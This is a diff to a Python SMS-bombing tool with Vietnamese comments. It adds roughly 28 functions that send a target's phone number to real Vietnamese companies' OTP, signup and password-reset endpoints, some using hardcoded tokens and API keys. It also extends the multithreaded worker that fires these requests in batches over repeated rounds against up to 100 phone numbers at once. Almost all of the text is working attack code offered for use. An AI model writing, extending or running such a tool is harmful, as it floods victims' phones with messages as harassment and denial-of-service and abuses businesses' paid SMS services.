@@ -24,7 +24,7 @@ MAX_CONCURRENT_TARGETS = 100    # Giới hạn số job đồng thời
 MAX_THREADS_PER_TARGET = 50     # Số thread cho mỗi job
 BATCH_SIZE = 20                  # Số lượng gửi trong mỗi batch
 DELAY_BETWEEN_ROUNDS_SEC = (2, 4)  # Delay giữa các vòng
-REQUEST_TIMEOUT = 5              # Timeout cho mỗi request
+REQUEST_TIMEOUT = 10             # Timeout cho mỗi request
 
 # Cache sessions để tái sử dụng
 session_cache = {}
@@ -1019,6 +1019,239 @@ def send_otp_via_hoangphuconline(phone: str):
     except:
         pass
 
+def send_otp_via_alfrescos(phone: str):
+    try:
+        session = get_session()
+        json_data = {'phoneNumber': phone, 'secureHash': '89b4c1ea1b74bac29a66281dbd879e00', 'deviceId': '', 'sendTime': 1701424097166, 'type': 1}
+        session.post('https://api.alfrescos.com.vn/api/v1/User/SendSms', params={'culture': 'vi-VN'}, json=json_data, timeout=REQUEST_TIMEOUT)
+    except:
+        pass
+
+def send_otp_via_selly(phone: str):
+    try:
+        session = get_session()
+        phone_fmt = '+84' + phone[1:] if phone.startswith('0') else phone
+        json_data = {'phone': phone_fmt, 'forceSendSms': True, 'checksum': '8539e0f677a98bd1bac1f9c50992363b95b36abe'}
+        session.post('https://app-api.selly.vn/users/request-otp', json=json_data, timeout=REQUEST_TIMEOUT)
+    except:
+        pass
+
+def send_otp_via_medpro(phone: str):
+    try:
+        session = get_session()
+        json_data = {'fullname': 'nguoi dung medpro', 'deviceId': 'f812a55d1d5ee2b87a927833df2608bc', 'phone': phone, 'type': 'password'}
+        session.post('https://api-v2.medpro.com.vn/user/phone-register', json=json_data, timeout=REQUEST_TIMEOUT)
+    except:
+        pass
+
+def send_otp_via_circa(phone: str):
+    try:
+        session = get_session()
+        phone_num = phone[1:] if phone.startswith('0') else phone
+        json_data = {'phone': {'country_code': '84', 'phone_number': phone_num}}
+        session.post('https://api.circa.vn/v1/entity/validation-phone', json=json_data, timeout=REQUEST_TIMEOUT)
+    except:
+        pass
+
+def send_otp_via_ticketbox(phone: str):
+    try:
+        session = get_session()
+        json_data = {'phone': '+84' + phone}
+        session.post('https://api-movie.ticketbox.vn/v1/users/otps/send', json=json_data, timeout=REQUEST_TIMEOUT)
+    except:
+        pass
+
+def send_otp_via_medlatec(phone: str):
+    try:
+        session = get_session()
+        data = f'PhoneOrEmail={phone}&Password=%40vrxx1337&ConfirmPassword=%40vrxx1337'
+        session.post('https://medlatec.vn/auth/register/', data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, timeout=REQUEST_TIMEOUT)
+    except:
+        pass
+
+def send_otp_via_acfc(phone: str):
+    try:
+        session = get_session()
+        data = {'number_phone': phone, 'form_key': 'qVs787dP8DpMIb0L', 'currentUrl': 'https://www.acfc.com.vn/customer/account/create/'}
+        session.post('https://www.acfc.com.vn/mgn_customer/customer/sendOTP', data=data, timeout=REQUEST_TIMEOUT)
+    except:
+        pass
+
+def send_otp_via_vamo(phone: str):
+    try:
+        session = get_session()
+        phone_num = phone[1:] if phone.startswith('0') else phone
+        json_data = {'username': phone_num}
+        session.post('https://vamo.com.vn/ws/api/public/login-with-otp/generate-otp', json=json_data, timeout=REQUEST_TIMEOUT)
+    except:
+        pass
+
+def send_otp_via_meta(phone: str):
+    try:
+        session = get_session()
+        json_data = {'api_args': {'lgUser': phone, 'type': 'phone'}, 'api_method': 'CheckRegister'}
+        session.post('https://meta.vn/app_scripts/pages/AccountReact.aspx', params={'api_mode': '1'}, json=json_data, timeout=REQUEST_TIMEOUT)
+    except:
+        pass
+
+def send_otp_via_cellphones(phone: str):
+    try:
+        session = get_session()
+        json_data = {'phone': phone, 'g-recaptcha-response': ''}
+        session.post('https://api.cellphones.com.vn/v3/otp/phone/lost-password', json=json_data, timeout=REQUEST_TIMEOUT)
+    except:
+        pass
+
+def send_otp_via_funring(phone: str):
+    try:
+        session = get_session()
+        phone_num = phone[1:] if phone.startswith('0') else phone
+        json_data = {'username': phone_num, 'captcha': 'xdm5n'}
+        session.post('http://funring.vn/api/v1.0.1/jersey/user/getotp', json=json_data, timeout=REQUEST_TIMEOUT)
+    except:
+        pass
+
+def send_otp_via_phuclong(phone: str):
+    try:
+        session = get_session()
+        json_data = {'userName': phone}
+        session.post('https://api-crownx.winmart.vn/as/api/plg/v1/user/forgot-pwd', json=json_data, timeout=REQUEST_TIMEOUT)
+    except:
+        pass
+
+def send_otp_via_gapowork(phone: str):
+    try:
+        session = get_session()
+        json_data = {'phone_number': phone, 'device_id': '9434ec2e-61e7-4b48-913b-ec9eaf31220b', 'device_model': 'web'}
+        session.post('https://api.gapowork.vn/auth/v3.1/signup', json=json_data, timeout=REQUEST_TIMEOUT)
+    except:
+        pass
+
+def send_otp_via_vietlott(phone: str):
+    try:
+        session = get_session()
+        json_data = {'phoneNumber': phone}
+        session.post('https://api-mobi.vietlottsms.vn/mobile-api/register/registerWithPhoneNumber', json=json_data, timeout=REQUEST_TIMEOUT)
+    except:
+        pass
+
+def send_otp_via_thitruongsi(phone: str):
+    try:
+        session = get_session()
+        json_data = {'account_phone': phone, 'recaptcha_token': '', 'recaptcha_verify_only': True}
+        session.post('https://api.thitruongsi.com/v1/user/api/v4/users/register/step1-phone', json=json_data, timeout=REQUEST_TIMEOUT)
+    except:
+        pass
+
+def send_otp_via_nhathuocankhang(phone: str):
+    try:
+        session = get_session()
+        data = {'phoneNumber': phone, 'isReSend': 'false', 'sendOTPType': '1', '__RequestVerificationToken': 'CfDJ8NJ72x-heHlJrMocXFWhvq7MuAMwPk1UH9-tms4I4JoAfe2Rb76O5SFZTOjFJa4WAHTfXmtlRI4wAuwvdpTr9CPqCxuNz8NI0u5b0Ula-MtLDMDEQ4C5CHijrHd_sJOne8tLVN9DfeXIgnca4GDNPNY'}
+        session.post('https://www.nhathuocankhang.com/lich-su-mua-hang/LoginV2/GetVerifyCode', data=data, timeout=REQUEST_TIMEOUT)
+    except:
+        pass
+
+def send_otp_via_chotot(phone: str):
+    try:
+        session = get_session()
+        json_data = {'phone': phone, 'password': '', 'otp': '', 'platform': 'w'}
+        session.post('https://gateway.chotot.com/v2/public/auth/forget_password', json=json_data, timeout=REQUEST_TIMEOUT)
+    except:
+        pass
+
+def send_otp_via_utop(phone: str):
+    try:
+        session = get_session()
+        phone_fmt = '+84' + phone[1:] if phone.startswith('0') else phone
+        json_data = {'phoneNumber': phone_fmt}
+        headers = {'ocp-apim-subscription-key': 'd4fc34dd08904749be498e5e47b813cc', 'api-version': 'v1'}
+        session.post('https://api.utopapp.net/partner/otp/RequestOTP', json=json_data, headers=headers, timeout=REQUEST_TIMEOUT)
+    except:
+        pass
+
+def send_otp_via_bachhoaxanh(phone: str):
+    try:
+        session = get_session()
+        json_data = {'deviceId': '7b33dc50-81df-4f90-b265-cdf6abbeb30f', 'userName': phone, 'isOnlySms': 0, 'ip': ''}
+        headers = {'authorization': 'Bearer C56D97E26D5A1DEE4199D9A6A06C082F', 'xapikey': 'bhx-api-core-2022', 'platform': 'webnew', 'deviceid': '7b33dc50-81df-4f90-b265-cdf6abbeb30f'}
+        session.post('https://apibhx.tgdd.vn/User/LoginWithPassword', json=json_data, headers=headers, timeout=REQUEST_TIMEOUT)
+    except:
+        pass
+
+def send_otp_via_aloline(phone: str):
+    try:
+        session = get_session()
+        json_data = {'phone': phone}
+        headers = {'ProjectId': '8003', 'Method': '1'}
+        session.post('https://api.gateway.overate-vntech.com/api/v8/customers/register', json=json_data, headers=headers, timeout=REQUEST_TIMEOUT)
+    except:
+        pass
+
+def send_otp_via_mioto(phone: str):
+    try:
+        session = get_session()
+        phone_fmt = '84' + phone[1:] if phone.startswith('0') else phone
+        params = {'phone': ' ' + phone_fmt, 'action': '1', 'otpBy': '0'}
+        session.post('https://accounts.mioto.vn/mapi/phone/otp/gen', params=params, timeout=REQUEST_TIMEOUT)
+    except:
+        pass
+
+def send_otp_via_vnggames(phone: str):
+    try:
+        session = get_session()
+        json_data = {'phone': phone, 'password': 'AZ56pkAeNfyXemY', 'regionCode': '', 'isoCode': 'VN', 'countryCode': 'VN', 'countryCodeType': '1', 'languageCode': 'vi', 'deviceId': 'Chrome_Windows_desktop', 'clientId': '0'}
+        session.post('https://id.vnggames.app/api/v1/signup', json=json_data, timeout=REQUEST_TIMEOUT)
+    except:
+        pass
+
+def send_otp_via_oreka(phone: str):
+    try:
+        session = get_session()
+        json_data = {'variables': {'phone': phone, 'locale': 'vi'}, 'query': 'mutation ($phone: String!, $locale: String!) {\nsendVerifyPhoneApp(phone: $phone, locale: $locale)\n}\n'}
+        session.post('https://www.oreka.vn/graphql', json=json_data, timeout=REQUEST_TIMEOUT)
+    except:
+        pass
+
+def send_otp_via_ensure(phone: str):
+    try:
+        session = get_session()
+        data = {'type': 'LTS', 'campagin_name': 'ENS_2024_LTS_Mar', 'name': 'Nguyen Van A', 'dob': '15-06-1998', 'address': '123 Phuong Chau Xuan', 'email': 'test@gmail.com', 'city': 'Ha Noi', 'city_code': 'HN', 'district': 'Ba Dinh', 'district_code': 'HN.BD', 'phone': phone, '_token': 'bp4PjS1lA8VwWHWsxASQl5SoKR350m13xsdyfvzO'}
+        session.post('https://ensure.vn/process-page1/getotp', data=data, timeout=REQUEST_TIMEOUT)
+    except:
+        pass
+
+def send_otp_via_vsports(phone: str):
+    try:
+        session = get_session()
+        json_data = {'email': phone}
+        session.post('https://vsports.vn/api/v1/users/verify/send', params={'lang': 'vi'}, json=json_data, timeout=REQUEST_TIMEOUT)
+    except:
+        pass
+
+def send_otp_via_ssi(phone: str):
+    try:
+        session = get_session()
+        json_data = {'mobile': phone, 'email': 'test@gmail.com', 'fullName': 'Nguyen Van A', 'password': 'K36U7JG#Ffy#9#!', 'channel': 'AP'}
+        session.post('https://accounts-api.ssi.com.vn/customer/account/validate-non-trading-user-info', json=json_data, timeout=REQUEST_TIMEOUT)
+    except:
+        pass
+
+def send_otp_via_fptshop2(phone: str):
+    try:
+        session = get_session()
+        data = {'phone': phone, 'typeReset': '0'}
+        session.post('https://fptshop.com.vn/api-data/loyalty/Login/Verification', data=data, timeout=REQUEST_TIMEOUT)
+    except:
+        pass
+
+def send_otp_via_tv360m(phone: str):
+    try:
+        session = get_session()
+        json_data = {'msisdn': phone}
+        session.post('https://m.tv360.vn/public/v1/auth/get-otp-login', json=json_data, timeout=REQUEST_TIMEOUT)
+    except:
+        pass
+
 # DANH SÁCH TẤT CẢ CÁC HÀM GỬI
 ALL_SENDERS = [
     ("sapo", send_otp_via_sapo),
@@ -1100,12 +1333,48 @@ ALL_SENDERS = [
     ("guardian", send_otp_via_guardian),
     ("jollibee", send_otp_via_jollibee),
     ("hoangphuconline", send_otp_via_hoangphuconline),
+    ("alfrescos", send_otp_via_alfrescos),
+    ("selly", send_otp_via_selly),
+    ("medpro", send_otp_via_medpro),
+    ("circa", send_otp_via_circa),
+    ("ticketbox", send_otp_via_ticketbox),
+    ("medlatec", send_otp_via_medlatec),
+    ("acfc", send_otp_via_acfc),
+    ("vamo", send_otp_via_vamo),
+    ("meta", send_otp_via_meta),
+    ("cellphones", send_otp_via_cellphones),
+    ("funring", send_otp_via_funring),
+    ("phuclong", send_otp_via_phuclong),
+    ("gapowork", send_otp_via_gapowork),
+    ("vietlott", send_otp_via_vietlott),
+    ("thitruongsi", send_otp_via_thitruongsi),
+    ("nhathuocankhang", send_otp_via_nhathuocankhang),
+    ("chotot", send_otp_via_chotot),
+    ("utop", send_otp_via_utop),
+    ("bachhoaxanh", send_otp_via_bachhoaxanh),
+    ("aloline", send_otp_via_aloline),
+    ("mioto", send_otp_via_mioto),
+    ("vnggames", send_otp_via_vnggames),
+    ("oreka", send_otp_via_oreka),
+    ("ensure", send_otp_via_ensure),
+    ("vsports", send_otp_via_vsports),
+    ("ssi", send_otp_via_ssi),
+    ("fptshop2", send_otp_via_fptshop2),
+    ("tv360m", send_otp_via_tv360m),
 ]
 
 # CHIA BATCH
 SENDER_BATCHES = [ALL_SENDERS[i:i+BATCH_SIZE] for i in range(0, len(ALL_SENDERS), BATCH_SIZE)]
 
 # HÀM SPAM CHÍNH - ĐÃ SỬA LỖI
+def call_api_with_log(name, func, phone):
+    """Wrapper gọi API và trả về kết quả để log"""
+    try:
+        func(phone)
+        return (name, True, None)
+    except Exception as e:
+        return (name, False, str(e))
+
 def spam_worker(phone: str, total_rounds: int, stop_event: threading.Event):
     for round_num in range(1, total_rounds + 1):
         if stop_event.is_set():
@@ -1114,26 +1383,41 @@ def spam_worker(phone: str, total_rounds: int, stop_event: threading.Event):
 
         print(f"[{phone}] Round {round_num}/{total_rounds} started")
 
+        success_count = 0
+        fail_count = 0
+
         # Gửi theo batch
         for batch_idx, batch in enumerate(SENDER_BATCHES):
             if stop_event.is_set():
                 break
             
+            batch_names = [name for name, _ in batch]
+            print(f"[{phone}] Batch {batch_idx+1}/{len(SENDER_BATCHES)} - Gửi: {', '.join(batch_names)}")
+            
             with ThreadPoolExecutor(max_workers=min(MAX_THREADS_PER_TARGET, len(batch))) as executor:
                 futures = []
                 for name, func in batch:
-                    futures.append(executor.submit(func, phone))
+                    futures.append(executor.submit(call_api_with_log, name, func, phone))
                 
-                # Đợi các future hoàn thành nhưng không quá lâu
+                # Đợi các future hoàn thành
                 for future in futures:
                     try:
                         if stop_event.is_set():
                             break
-                        future.result(timeout=REQUEST_TIMEOUT)
-                    except:
-                        pass
+                        result = future.result(timeout=REQUEST_TIMEOUT + 5)
+                        if result:
+                            api_name, ok, err = result
+                            if ok:
+                                success_count += 1
+                            else:
+                                fail_count += 1
+                                print(f"[{phone}] ❌ {api_name}: {err}")
+                    except Exception as e:
+                        fail_count += 1
             
-            print(f"[{phone}] Batch {batch_idx+1}/{len(SENDER_BATCHES)} completed")
+            print(f"[{phone}] Batch {batch_idx+1}/{len(SENDER_BATCHES)} xong")
+        
+        print(f"[{phone}] Round {round_num} xong - ✅ {success_count} thành công, ❌ {fail_count} lỗi")
         
         # Delay giữa các round
         if round_num < total_rounds and not stop_event.is_set():
